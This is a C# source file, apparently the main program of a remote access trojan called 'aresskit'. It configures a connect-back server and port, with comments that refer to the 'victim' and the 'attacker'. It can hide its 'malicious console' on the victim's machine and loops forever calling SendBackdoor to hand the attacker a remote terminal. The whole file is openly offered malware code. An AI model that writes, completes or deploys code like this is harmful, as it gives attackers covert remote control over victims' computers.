using System;

namespace aresskit
{
    class Program
    {
        static void Main()
        {
            Core.VicServer = "localhost"; // Server Hostname or IP Address to connect back to.
            Core.VicPort = 9000; // TCP Port to connect back to.
            Core.HideConsole = false; // Show/Hide malicious console on Clients (victims) computer.
            Core.CMDSplitter = "::"; // Characters to split Class/Method in command input (ex: Administration::IsAdmin or Administration->IsAdmin)

            // Hide Window
            if (Core.HideConsole)
                Toolkit.HideWindow();
            
            while (true)
            {
                if (Network.checkInternetConn("www.google.com") || Core.VicServer == "localhost")
                {
                    try
                    {
                        // Console.WriteLine("Sending RAT terminal to: {0}, port: {1}", server, port);
                        Core.SendBackdoor(Core.VicServer, Core.VicPort);
                    }
                    catch (System.Net.Sockets.SocketException) // Attacker Server has most likely forced disconnect
                    { Console.WriteLine("Attacker has disconnected."); }
                    catch (Exception e)
                    { Console.WriteLine(e); } // pass silently
                }
            }
        }
    }
}
